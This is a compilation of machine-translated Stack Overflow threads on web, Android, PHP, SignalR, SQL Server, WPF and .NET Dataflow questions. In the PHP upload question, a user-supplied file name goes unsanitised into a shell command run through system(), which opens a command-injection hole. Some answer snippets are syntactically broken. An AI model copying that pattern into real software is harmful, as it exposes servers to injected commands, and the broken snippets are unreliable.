 h1, h2, h3, h4, h5, h6 {
        text-align: center;
    } 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-10-13T13:01:53.503

Bootstrap 带有许多预构建类，其中之一是`class="text-left"`. 请在需要时致电本课程。:-)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-09-01T12:54:05.693

在当前版本的 bootstrap 5.2.0 中，它是：text-center、(center) text-end、(right) text-start、(left)。

```
<p class="text-start">Start aligned text on all viewport sizes.</p>
<p class="text-center">Center aligned text on all viewport sizes.</p>
<p class="text-end">End aligned text on all viewport sizes.</p> 
```

# android - android ndk-build 错误

> ID：11155054
> 
> 赞同：4
> 
> 时间：2012-06-22T11:09:49.610
> 
> 标签：android, android-ndk, tesseract

我正在尝试为 android 构建 tesseract。我已将 tesseract 放在示例文件夹中

`C:\Android_NDK\android-ndk-r8\samples\tesseract` 在`tesseract`文件夹中，我有`tesseract-3.00`文件夹、`leptonlib-1.66`文件夹和`libjpeg`文件夹。每当我尝试使用 ndk-build 构建代码时。我得到错误

`C:/Android_NDK/android-ndk-r8/build/core/build-binary.mk:240: *** target pattern contains no '%'. Stop.`

我在命令提示符中像这样使用 ndk-build `C:\Android_NDK\android-ndk-r8\samples\tesseract\jni>C:\Android_NDK\android-ndk-r8/ndk-build`

`Application.mk`tesseract/jni 文件夹中的文件内容
`# ARMv7 is significanly faster due to the use of the hardware FPU
APP_STL := gnustl_static
APP_ABI := armeabi armeabi-v7a
APP_OPTIM := release
APP_CPPFLAGS += -fexceptions -frtti`

```
 Android.mk file contents in tesseract/jni folder  
# NOTE: You must set these variables to their respective source paths before
# compiling. For example, set LEPTONICA_PATH to the directory containing
# the Leptonica configure file and source folders. Directories must be
# root-relative, e.g. TESSERACT_PATH := /home/username/tesseract-3.00
#
# To set the variables, you can run the following shell commands:
# export TESSERACT_PATH=<path-to-tesseract>
# export LEPTONICA_PATH=<path-to-leptonica>
# export LIBJPEG_PATH=<path-to-libjpeg>
#
# Or you can fill out and uncomment the following definitions:
# TESSERACT_PATH := <path-to-tesseract>
# LEPTONICA_PATH := <path-to-leptonica>
# LIBJPEG_PATH := <path-to-libjpeg>

ifeq "$(TESSERACT_PATH)" ""
  $(error You must set the TESSERACT_PATH variable to the Tesseract source \
      directory. See README and jni/Android.mk for details)
endif

ifeq "$(LEPTONICA_PATH)" ""
  $(error You must set the LEPTONICA_PATH variable to the Leptonica source \
      directory. See README and jni/Android.mk for details)
endif

ifeq "$(LIBJPEG_PATH)" ""
  $(error You must set the LIBJPEG_PATH variable to the Android JPEG \
      source directory. See README and jni/Android.mk for details)
endif

# Just build the Android.mk files in the subdirs
include $(call all-subdir-makefiles) $(LIBJPEG_PATH)/Android.mk 
```

尝试使用 Cygwin 但同样的问题。

期待你的答复。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-06-12T11:58:53.263

我认为您没有将以下代码添加到您的 buid.gradle 文件中。此解决方案适用于 android studio

```
 sourceSets.main {
    jniLibs.srcDir 'src/main/libs'
    jni.srcDirs = [] //disable automatic ndk-build call
} 
```

# php - 上传时文件重命名

> ID：11155058
> 
> 赞同：0
> 
> 时间：2012-06-22T11:10:11.053
> 
> 标签：php

我在尝试上传文件时遇到问题

第一次将文件名从 temp 移动到其各自的目录时，

但我再次尝试上传具有相同名称的不同文件，它应该重命名第一次上传的文件

使用 date_somefilename.csv 并将文件名赋予其原始状态

例如文件 test.csv ，我第一次上传它会上传到相应的目录

test.csv，当我上传一个同名的不同 csv 文件 test.csv

我需要得到

test.csv（最新上传的文件）

06222012130209_test.csv(首次上传文件)

代码如下

```
$place_file = "$path/$upload_to/$file_name";     

if (!file_exists('uploads/'.$upload_to.'/'.$file_name)) 
 {

move_uploaded_file($tmp, $place_file);  

}else{

 move_uploaded_file($tmp, $place_file); 
 $arr1 = explode('.csv',$file_name);
  $todays_date =  date("mdYHis");
   $new_filename = $todays_date.'_'.$arr1[0].'.csv';
  echo  $str_cmd = "mv " . 'uploads/'.$upload_to.'/'.$file_name . " uploads/$upload_to/$new_filename";
   system($str_cmd, $retval); 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:18:50.557

请参阅代码中的注释。

```
$place_file = "$path/$upload_to/$file_name";     

if (!file_exists($place_file)) {
    move_uploaded_file($tmp, $place_file);  
} else {
    // first rename
    $pathinfo = pathinfo($place_file);
    $todays_date = date("mdYHis");
    $new_filename = $pathinfo['dirname'].DIRECTORY_SEPARATOR.$todays_date.'_'.$pathinfo['basename'];
    rename($place_file, $new_filename)
    // and then move, not vice versa
    move_uploaded_file($tmp, $place_file); 
} 
```

[DIRECTORY_SEPARATOR](http://php.net/manual/en/dir.constants.php)是 php 常量。值是 '/' 或 '\'，取决于操作系统。

[pathinfo()](http://www.php.net/manual/en/function.pathinfo.php)是 php 函数，它返回有关路径的信息：目录名、基本名、扩展名、文件名。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:16:36.150

关于什么...

```
$place_file = "$path/$upload_to/$file_name";     

if (file_exists($place_file)) {
   $place_file = date("mdYHis")."_".$file_name;
}

if (!move_uploaded_file($tmp, $place_file)) {
   echo "Could not move file";
   exit;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T11:35:10.987

如果文件已经存在，我不会在文件中添加日期。相反，我只会在它的末尾添加一个数字。把事情简单化。

```
$counter = 0;
do {
    // destination path path
    $destination = $path.'/'.$upload_to.'/';

    // get extension
    $file_ext = end(explode('.', $file_name));

    // add file_name without extension
    if (strlen($file_ext))
        $destination .= substr($file_name, 0, strlen($file_name)-strlen($file_ext)-1);

    // add counter
    if ($counter)
        $destination .= '_'.$counter;       

    // add extension
    if (strlen($file_ext))
        $destination .= $file_ext;

    $counter++;
while (file_exists($destination));

// move file
move_uploaded_file($tmp, $destination); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T11:19:38.273

```
$target = "uploads/$upload_to/$file_name";
if (file_exists($target)) {
    $pathinfo = pathinfo($target);
    $newName = "$pathinfo[dirname]/" . date('mdYHis') . "_$pathinfo[filename].$pathinfo[extension]";
    rename($target, $newName);
}
move_uploaded_file($tmp, $target); 
```

但请注意：[上传的安全威胁](https://stackoverflow.com/questions/11061355/security-threats-with-uploads)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-22T11:20:05.497

这样的事情怎么样？

```
<?php

$tmp = '/tmp/foo'; // whatever you got out of $_FILES
$desitnation = '/tmp/bar.xyz'; // wherever you want that file to be saved

if (file_exists($desitnation)) {
  $file = basename($destination)
  $dot = strrpos($file, '.');

  // rename existing file to contain its creation time
  // "/temp/bar.xyz" -> "/temp/bar.2012-12-12-12-12-12.xyz"
  $_destination = dirname($destination) . '/'
      . substr($file, 0, $dot + 1)
      . date('Y-m-d-H-i-s', filectime($destination))
      . substr($file, $dot);

  rename($destination, $_destination);
}

move_uploaded_file($tmp, $destination); 
```

# asp.net - SignalR /signalr/hubs 404 未找到

> ID：11155064
> 
> 赞同：39
> 
> 时间：2012-06-22T11:10:23.050
> 
> 标签：asp.net, iis, signalr

我正在尝试在 IIS 上部署 SignalR 站点。代码在 VS 中一切正常。但是到目前为止，我尝试解决信号器/集线器时出现**404 not found错误。**

1）将脚本参考更改为：

```
script src="<%= ResolveUrl("~/signalr/hubs") %>" type="text/javascript"></script> 
```

2) 修改 Web.Config 以包括：

```
<system.webServer>
    <validation validateIntegratedModeConfiguration="false" />
    <modules runAllManagedModulesForAllRequests="true">
    </modules>
</system.webServer> 
```

3) 将 IIS 上的调用请求更改为`UrlMappingsModule`.

4）添加`SignalR.Hosting.AspNet.dll`以查看是否有帮助。

不知道还有什么可以尝试或检查的，有什么帮助或指向正确的方向吗？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-01-28T14:57:26.730

路线注册的顺序很重要。我遇到了这个确切的问题，并通过确保我的 global.asax.cs 看起来像这样来解决它：

```
public class MvcApplication : System.Web.HttpApplication
{
    protected void Application_Start()
    {
        AreaRegistration.RegisterAllAreas();
        RouteTable.Routes.MapHubs();

        WebApiConfig.Register(GlobalConfiguration.Configuration);
        FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
        RouteConfig.RegisterRoutes(RouteTable.Routes);
    }
} 
```

这是在一个同时使用 SignalR、MVC 和 WebApi 的网站中。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2015-02-16T09:32:49.377

此 404 错误的原因是集线器未映射，以前必须按照 SimonF 的回答完成。如果您使用的是 SignalR，第 2 版`RouteTable.Routes.MapHubs();`现已过时。对于映射中心，您可以创建一个启动类，如下所示。

```
[assembly: OwinStartup(typeof(WebApplication1.Startup))]
namespace WebApplication1
{
    public class Startup
    {
        public void Configuration(IAppBuilder app)
        {
            // Any connection or hub wire up and configuration should go here
            app.MapSignalR();
        }
    }
} 
```

参考：[http ://www.asp.net/signalr/overview/releases/upgrading-signalr-1x-projects-to-20](http://www.asp.net/signalr/overview/releases/upgrading-signalr-1x-projects-to-20)

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-06-25T10:20:30.923

尝试将通配符应用程序映射添加到您的服务器，以帮助映射脚本 URL“~/signalr/hubs”中的未知扩展名

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-05-23T07:40:57.887

如果您正在使用网络表单，请执行以下步骤

1.  在网络配置中：

    ```
    <validation validateIntegratedModeConfiguration="false" />
    <modules runAllManagedModulesForAllRequests="true"/> 
    ```

2.  在页面中添加对集线器的引用

    ```
    <script src="/signalr/signalr/hubs"></script> 
    ```

    代替

    ```
    <script src="/signalr/hubs"></script> 
    ```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-10-09T12:54:34.900

通过将 web.config 中的以下 appSetting 更改为“true”，我能够修复 ~/signalr/hubs 上的 404。

```
<add key="owin:AutomaticAppStartup" value="false" /> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-10T20:59:41.483

确保您站点的 AppPool 以正确版本的 .NET Framework 为目标。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-02-17T21:13:38.297

我可能有点晚了，但希望它对某人有所帮助。确保此代码在启动时运行。

```
 Sub Application_Start(ByVal sender As Object, ByVal e As EventArgs)
    RouteTable.Routes.MapHubs()
 End Sub 
```

因为我在我的应用程序中添加了一个 global.asax，然后是一个代码隐藏，但将它放在 Global.asax 文件中

```
 <%@ Application Language="VB" CodeBehind = "Global.asax.vb" %> /*This was wrong*/ 
```

所以当我尝试运行应用程序时，我 global.asax 中的 Application_Start 没有初始化集线器。这就是为什么它无法解析信号器/集线器

在我的 Global.asax 中修复了这个

```
 <%@ Application Inherits="_Global" Language="VB" %> 
```

这在我的 Global.asax.vb 中：

```
 Public Class _Global
     Inherits System.Web.HttpApplication 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-04-06T16:23:13.430

检查 web.config，在分段 AppSettings 添加

```
<add key="owin:AutomaticAppStartup " value="false" /> 
```

on Key 必须是名称键末尾的空格，例如 @Randy H。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-07-03T13:56:05.093

我在 MVC3 中的路由没有问题，但确实弄错了路径。我建议您查看源代码并查看脚本实际指向的位置，确保它可以正常解析应用程序目录。并确保您可以使用浏览器以正确的路径物理打开文件。例如

```
<script src="/MyWebApp/signalr/hubs" type="text/javascript"></script> 
```

您可以从浏览器打开文件（用正确的子目录替换它）吗？

如果不是，则集线器可能设置不正确，它可能会为您指明正确的方向。摆弄它。

我使用的语法是：

```
<script src="@Url.Content("~/signalr/hubs")" type="text/javascript"></script> 
```

这可能是[Url.Content 和 ResolveUrl之间的区别](https://stackoverflow.com/questions/2418050/should-i-use-url-content-or-resolveurl-in-my-mvc-views)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-04-22T06:32:13.847

我在 IIS 版本上遇到了类似的问题，我通过重新启动 AppPool、重新启动 web 和它的工作来修复它。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-07-31T10:08:28.150

这个 404 可能有很多原因 - 可以通过以下方式找到一些常见的原因

*   在浏览器 /signalr/hubs 中点击 url - 如果出现错误，您将看到完整的错误返回。
*   如果您有基类，请检查 HubName 属性是否重复
*   确保您在所有项目中引用了正确的版本（以避免绑定错误）

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-05-27T09:40:57.923

对我来说，解决方案是`reinstall`所有包并恢复所有依赖项。

打开 nuget`powershell`并使用此命令。

```
Update-Package -Reinstall 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-01-15T07:16:10.170

我遇到了同样的问题，它是一个使用 signalR 的 asp.net 项目，在我发布之前它工作正常，但是当我将它托管在 IIS 中时，它没有。

检查后发现地址 /signalr/hubs 不正确，让我解释一下，只需执行以下步骤：

1.  在浏览器中打开您的 Web 应用程序（使用 IIS），您会看到您设计的界面，是吗？现在按`ctrl+U`或右键单击页面并选择查看页面源。

2.  `<script>`您会在页面顶部 看到多个以标签开头的链接，找到类似`<script src="/signalr/hubs"></script>`现在单击它的内容，如果您被带到涉及“404 - 找不到文件或目录”的页面。您在定义地址时有一些错误，找到真实地址并在地址栏中更改地址观察真实结果

在我的情况下，我需要在地址的开头添加我的项目名称，所以我必须将地址更改为：

`<script src="/signalr/hubs"></script>`

到

`<script src="/MoveShape/signalr/hubs"></script>`

其中 MoveShape 是我的项目名称，现在在`ctrl+U`浏览器中按下并按照之前告诉的步骤后，单击链接，这一次你看到了真实的结果，页面显示代码以：

```
/*!
 * ASP.NET SignalR JavaScript Library v2.2.2
 * http://signalr.net/
 *
 * Copyright (c) .NET Foundation. All rights reserved.
 * Licensed under the Apache License, Version 2.0\. See License.txt in the project root for license information.
 *
 */ 
```

是的！就是这样，它工作正常，请记住，当我使用 Visual Studio 测试它时它没有问题，但在 IIS 中托管后没有问题，因为其他人建议通过应用`<%= ResolveUrl("~/") %>`或其他方法制作正确的地址。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-05-24T08:37:46.347

就我而言，我丢失了一些**owin 依赖项**，然后出现 404 *NotFound*错误。

当我添加以下依赖项时，我从预期的 URL 中清楚地检索了代理 javascript 文件。点赞网址：1111/singlar/hubs

> *   微软.Owin
> *   微软.Owin.Core
> *   Microsoft.Owin.Host.SystemWeb
> *   Microsoft.Owin.Security
> *   欧文

希望答案对某人有所帮助。

# sql - 在选择期间重新计算持久计算字段

> ID：11155069
> 
> 赞同：0
> 
> 时间：2012-06-22T11:10:44.780
> 
> 标签：sql, sql-server, sql-server-2008

> **可能重复：**
> [为什么执行计划包含一个用户定义的函数调用，用于持久化计算列？](https://stackoverflow.com/questions/5998217/why-does-the-execution-plan-include-a-user-defined-function-call-for-a-computed)

我已将持久计算列添加到表中。

```
ALTER TABLE guest
  ADD FullName AS
  dbo.complicatedFunction(ISNULL(FirstName, N'') + ISNULL(LastName, '')) PERSISTED
GO 
```

我还在该字段上添加了一个非聚集索引。

当我从该表中进行选择并将列包含到 where 语句中时，执行需要很长时间。

我尝试直接用表达式替换持久化的列，并且执行所需的时间相同，这使我相信当我尝试从该表中选择某些内容时，会为每一行重新计算 FullName 字段。

如何避免重新计算并让查询使用索引？

![执行计划](../Images/d2d1edf585be3b27621b9c48a833d253.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T21:03:09.660

> 原因是查询优化器在计算用户定义函数的成本方面做得不是很好。在某些情况下，它决定完全重新评估每一行的函数会更便宜，而不是导致可能需要的磁盘读取。

[为什么执行计划包含一个用户定义的函数调用，用于持久化计算列？](https://stackoverflow.com/questions/5998217/why-does-the-execution-plan-include-a-user-defined-function-call-for-a-computed)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-02T07:51:25.423

Martin Smith 发布了一个链接，该链接很好地解释了为什么会发生这种情况，在阅读完之后，我用它的主体替换了对 UDF 的调用，它解决了我的问题。

# c++ - Base64 字符串的区别

> ID：11155070
> 
> 赞同：1
> 
> 时间：2012-06-22T11:10:55.357
> 
> 标签：c++, base64

我正在从服务器向客户端发送带有某些对象的解码坐标的 base64 字符串。大约有 20 个对象具有 x;y 对，每个整数 2 个字节。这个坐标会随着时间而变化，但其中一些会为大约 2-3 次发送呼叫保存相同的值。

有什么方法可以计算差异并每次发送而不是完整的base64？网络流量在这里非常重要。

这是使用 100 毫秒暂停制作的 2 个字符串的示例：

```
AFg7IP+SAAJg/ana/zAA52BJO/D/9wAxIFkAIABIABQBSADtAFEAMGlLctX/
AFo7IP+SAAJgAKnb/0EA6GBJO/D//wA0IFkAIABIABQBSADtAEoAYmlLctX/ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:33:17.023

首先，以字节为单位有效地打包数据，然后在必要时进行编码。正如@twall 所说，您应该努力消除基数 64，因为它至少将数据大小扩展了 33%。如果正好有 20 个 x,y 对，这是一种打包方法：

字节 1-3：位集。每个位代表一个 x,y 对。如果设置，则此消息中有该对的更新值。第 3 个字节的最后 4 位未使用。

字节 5&6 x 第一个点的坐标 字节 7&8 y 第一个点的坐标

... 最多 19 分

最多 83 个字节，最少 3 个字节（未更新坐标）

# javascript - 简单模式不起作用

> ID：11155072
> 
> 赞同：2
> 
> 时间：2012-06-22T11:11:25.293
> 
> 标签：javascript, mootools, simplemodal

我对简单的模态有问题！不工作我有一些错误！我在 header.php 中有 mootols 和 jquery

错误是：

```
Uncaught TypeError: Object #<Object> has no method 'addEvent' demo.js:8
(anonymous function) demo.js:8
(anonymous function) mootools-core-1.3.1.js:354
h mootools-core-1.3.1.js:32
Array.implement.each mootools-core-1.3.1.js:38
invoke.fireEvent mootools-core-1.3.1.js:353
h 
```

我的代码是：

```
 <script type="text/javascript" src="js/mootools-core-1.3.1.js"></script>
<script type="text/javascript" src="js/mootools-more-1.3.1.1.js"></script>
    <script type="text/javascript" src="js/simple-modal.js"></script>
<script type="text/javascript" src="js/demo.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:14:07.747

将最后一个脚本标签移到第一个

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
<script type="text/javascript" src="js/mootools-core-1.3.1.js"></script>
<script type="text/javascript" src="js/mootools-more-1.3.1.1.js"></script>
    <script type="text/javascript" src="js/simple-modal.js"></script>
<script type="text/javascript" src="js/demo.js"></script> 
```

它会工作..

或者您的页面上可能有多个 jQuery 实例。

您需要：

*   Aet摆脱其中一个（没有必要同时拥有）
*   别名 custom.js 中使用的 jQuery
*   使用[noConflict()](http://api.jquery.com/jQuery.noConflict/)来解析哪个 jQuery 可以访问 $ 变量。

# jquery - 使用 jQuery 性能创建 DOM 元素

> ID：11155073
> 
> 赞同：1
> 
> 时间：2012-06-22T11:11:31.943
> 
> 标签：jquery, performance, dom, append

目前我正在使用以下代码将某些元素附加到 DOM：

```
$('<p/>', { html: data } ).appendTo('.columnLeft'); 
```

但是因为需要附加很多元素，所以我有点担心性能。在我使用之前`{ html: data }`我已经尝试过`{ text: data }`. 但是因为有时数据变量中有 html，所以我将其更改为`{ html: data }`. 我真的没有衡量性能的工具，所以我想知道这里是否有人知道什么更快？

谢谢阅读！

如下所述，我制作了自己的测试用例，您可以[在此处查看](http://jsperf.com/appendtestluud)。根据测试，亚当给出的解决方案是最快的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:17:17.193

使用 jQuery 将 HTML 元素附加到 DOM 的最快方法是将它们附加为 HTML 字符串，如下所示：

```
var myHTML = '<p>'+data+'</p>';
$('.columnLeft').append(myHTML); 
```

这样，jQuery 就不必在将 DOM 元素实际附加到 DOM 之前执行创建 DOM 元素的过程。

# wpf - 如何在我的 Gridview 列标题 WPF VS2010 上添加工具提示文本

> ID：11155077
> 
> 赞同：8
> 
> 时间：2012-06-22T11:11:39.510
> 
> 标签：wpf, gridview, columnheader

这是我的网格，当鼠标悬停在该标题上以显示 expl 时，我要对标题“RED.BROJ”进行解释。文本。

```
<ListView.View>
    <GridView>
        <GridViewColumn Width="50"
                        Header="Реd.Број"
                        DisplayMemberBinding="{Binding Path=RedenBroj}">
        </GridViewColumn> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-22T12:48:43.790

你可以这样做：

```
<GridViewColumn Width="50"
                DisplayMemberBinding="{Binding Path=RedenBroj}">
    <GridViewColumn.Header>
        <TextBlock Text="Ред.Број"
                   ToolTip="Your explanation" />                      
    </GridViewColumn.Header>        
</GridViewColumn> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-04-23T13:16:56.677

Slightly late response but you can add a tooltip, without losing the ability to drag columns to reorder them, by doing the following:

```
<GridViewColumn Width="50"
                Header="Реd.Број"
                DisplayMemberBinding="{Binding Path=RedenBroj}">
    <GridViewColumn.HeaderContainerStyle>
        <Style>
            <Setter Property="Control.ToolTip" Value="Tool tip content"/>
        </Style>
    </GridViewColumn.HeaderContainerStyle>
</GridViewColumn> 
```

Update: more concise version thanks to [LPL](https://stackoverflow.com/users/620360/lpl)

Further update: I wanted to be able to have all columns have tooltips that match their headers (as some columns were too narrow to show the whole header):

```
<ListView.View>
    <GridView>
        <GridView.ColumnHeaderContainerStyle>
            <Style TargetType="GridViewColumnHeader">
                <Setter Property="ToolTip"
                        Value="{Binding Content, RelativeSource={RelativeSource Self}}"/>
            </Style>
        </GridView.ColumnHeaderContainerStyle>

        <GridViewColumn DisplayMemberBinding="{Binding A}" Header="A"/>
        <GridViewColumn DisplayMemberBinding="{Binding B}" Header="B"/>
        <GridViewColumn DisplayMemberBinding="{Binding C}" Header="C"/>
    </GridView>
</ListView> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-03-28T21:45:18.670

没有什么比用自己的方式回答一个老问题更好的了……

我受到**@Scroog1 的**回答的启发，但似乎有点多余，`Tooltip`它只是模仿那里的内容。您通常需要 ，`Tooltip`因为您已经缩写了列标题文本。

我创建了一个`AttachedProperty`我`Tooltip`在`GridViewColumn`. 我再到`bind`此从我`Style`为我`GridViewColumnHeader`。

现在我只定义`Style`一次，然后添加它以及`AttachedProperty`我想在哪里使用它。

### Xaml

```
 <Style x:Key="GridViewColumnHeaderStyle" TargetType="{x:Type GridViewColumnHeader}">
        <Setter Property="ToolTip" Value="{Binding Path=Column.(attachedProperties:GridViewColumnHeaderToolTipAttachedProperty.Tooltip), RelativeSource={RelativeSource Self}}" />
    </Style>

    <GridView x:Key="GridViewFuelConsumption"
              x:Shared="False">
        <GridViewColumn Header="Ред.Број"
                        DisplayMemberBinding="{Binding RedenBroj}"
                        HeaderContainerStyle="{StaticResource GridViewColumnHeaderStyle}"
                        attachedProperties:GridViewColumnHeaderToolTipAttachedProperty.Tooltip="Your explanation" />
    </GridView> 
```

### 附加属性

```
public sealed class GridViewColumnHeaderToolTipAttachedProperty : DependencyObject
{
    public static readonly DependencyProperty TooltipSourceProperty = DependencyProperty.RegisterAttached(
        "Tooltip",
        typeof(string),
        typeof(GridViewColumnHeaderToolTipAttachedProperty),
        new PropertyMetadata("null"));

    public static void SetTooltip(DependencyObject element, string value)
    {
        element.SetValue(TooltipSourceProperty, value);
    }

    public static string GetTooltip(DependencyObject element)
    {
        return (string)element.GetValue(TooltipSourceProperty);
    }
} 
```

# android - 自定义日志报告 - ACRA Android

> ID：11155081
> 
> 赞同：3
> 
> 时间：2012-06-22T11:11:56.733
> 
> 标签：android, acra

我正在为这样的 Android 应用程序使用 ACRA

```
@ReportsCrashes(formKey = "dEpU12345lRZYjFtOUxMVHl4MFpMdnc6MQ",  mailTo = "issues@xyz.com",
    customReportContent = { ReportField.ANDROID_VERSION, ReportField.PHONE_MODEL, ReportField.CUSTOM_DATA, ReportField.STACK_TRACE, ReportField.LOGCAT },                
    mode = ReportingInteractionMode.TOAST,
    resToastText = R.string.crash_toast_text) 
```

它完美地与 Log cat 一起发送崩溃报告。默认情况下，它会发送所有最后 200 行带有日期的 logcat。但我想自定义它以仅发送我的应用程序的最后 100 条 log cat 消息，日志级别为 i 或 d。怎么做。

通过以下链接

[https://github.com/ACRA/acra/wiki/AdvancedUsage#adding-logcat-eventlog-or-radiolog-extracts-to-reports](https://github.com/ACRA/acra/wiki/AdvancedUsage#adding-logcat-eventlog-or-radiolog-extracts-to-reports)

我做了这样的改变

```
@ReportsCrashes(formKey = "dEpU12345lRZYjFtOUxMVHl4MFpMdnc6MQ",  mailTo = "issues@xyz.com",
    customReportContent = { ReportField.ANDROID_VERSION, ReportField.PHONE_MODEL, ReportField.CUSTOM_DATA, ReportField.STACK_TRACE, ReportField.LOGCAT },
    logcatArguments = { "-t", "100", "-v", "long","test:I" ,"*:D","*:S"},        
    mode = ReportingInteractionMode.TOAST,
    resToastText = R.string.crash_toast_text) 
```

即使我打印了一些带有标签“test”和级别“i”的日志消息，并在我的应用程序已知崩溃之前管理它们打印，但我得到了空的 logcat。我只想要我的应用程序的日志消息，级别为 i 或 d 与 ACRA，如何实现这一点。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-04T17:10:28.500

以下适用于 D 级日志记录。我的 proguard 为生产部署剥离了 V 和 I 级别。我正在使用以下代码来更新日志

```
Log.d("YOUR_TAG_HERE", "Some message here"); 
```

并且 ACRA 配置是

```
logcatArguments = { "-t", "200", "-v", "long", "ActivityManager:I", "YOUR_TAG_HERE:D", "*:S" } 
```

并且不要忘记更新您的 AndroidManifest.xml 文件添加必要的权限

```
<uses-permission android:name="android.permission.READ_LOGS" /> 
```

我的图书馆项目遇到问题，并且我的 READ_LOGS 权限丢失。在我将 READ_LOGS 权限添加到最终项目（而不是库项目）之前，我得到了随机结果。

# c# - TPL 数据流加速？

> ID：11155085
> 
> 赞同：5
> 
> 时间：2012-06-22T11:12:01.720
> 
> 标签：c#, concurrency, task-parallel-library, tpl-dataflow

我想知道是否可以优化以下代码以更快地执行。我目前似乎在一个非常简单的数据流结构上每秒最多可以处理 140 万条简单消息。我知道这个示例过程同步传递/转换消息，但是，我目前测试 TPL Dataflow 作为我自己的基于任务和并发集合的自定义解决方案的可能替代品。我知道术语“并发”已经建议我并行运行，但为了当前的测试目的，我通过同步在自己的解决方案上推送消息，每秒大约有 510 万条消息。我在这里缺少什么，我读到 TPL 数据流被推为高吞吐量、低延迟的解决方案，但到目前为止我必须忽略性能调整。谁能指出我正确的方向？

```
class TPLDataFlowExperiments
{
    public TPLDataFlowExperiments()
    {
        var buf1 = new BufferBlock<int>();

        var transform = new TransformBlock<int, string>(t =>
            {
                return "";
            });

        var action = new ActionBlock<string>(s =>
            {
                //Thread.Sleep(100);
                //Console.WriteLine(s);
            });

        buf1.LinkTo(transform);
        transform.LinkTo(action);

        //Propagate all Completions down the flow
        buf1.Completion.ContinueWith(t =>
        {
            transform.Complete();
            transform.Completion.ContinueWith(u =>
            {
                action.Complete();
            });
        });

        Stopwatch watch = new Stopwatch();
        watch.Start();

        int cap = 10000000;
        for (int i = 0; i < cap; i++)
        {
            buf1.Post(i);
        }

        //Mark Buffer as Complete
        buf1.Complete();

        action.Completion.ContinueWith(t =>
            {
                watch.Stop();

                Console.WriteLine("All Blocks finished processing");
                Console.WriteLine("Units processed per second: " + cap / watch.ElapsedMilliseconds * 1000);
            });

        Console.ReadLine();
    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-22T13:07:52.220

我认为这主要归结为一件事：您的测试几乎毫无意义。所有这些块都应该做一些事情，并使用多个内核和异步操作来做到这一点。

此外，在您的测试中，可能会花费大量时间进行同步。使用更真实的代码，代码将需要一些时间来执行，因此争用会更少，因此实际开销会比您测量的要小。

但是要真正回答您的问题，是的，您忽略了一些性能调整。具体来说，[`SingleProducerConstrained`](http://msdn.microsoft.com/en-us/library/system.threading.tasks.dataflow.executiondataflowblockoptions.singleproducerconstrained%28v=vs.110%29.aspx)，这意味着可以使用具有较少锁定的数据结构。如果我在两个块上都使用它（`BufferBlock`这里完全没用，你可以安全地删除它），我的计算机上的速率从每秒大约 3-4 百万个项目提高到超过 500 万个。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T14:21:52.123

为了增加 svick 的答案，该测试仅对单个操作块使用单个处理线程。这样，它只测试使用块的开销。

DataFlow 的工作方式类似于 F# 代理、Scala 角色和 MPI 实现。每个动作块一次执行一个任务，监听输入并产生输出。加速是通过分步分解算法来提供的，该算法可以在多个内核上独立执行，只相互传递消息。

虽然您可以增加并发任务的数量，但最重要的问题是设计一个独立于其他步骤执行最大数量步骤的流程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-03T21:17:25.660

您还可以增加数据流块的并行度。这可能会提供额外的加速，并且如果您发现其中一个块充当其余块的瓶颈，还可以帮助线性任务之间的负载平衡。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-11T11:42:03.357

如果您的工作负载非常精细，以至于您希望每秒处理数百万条消息，那么由于相关的开销，通过管道传递单个消息变得不可行。您需要通过将消息批处理到数组或列表来分块化工作负载。例如：

```
var transform = new TransformBlock<int[], string[]>(batch =>
{
    var results = new string[batch.Length];
    for (int i = 0; i < batch.Length; i++)
    {
        results[i] = ProcessItem(batch[i]);
    }
    return results;
}); 
```

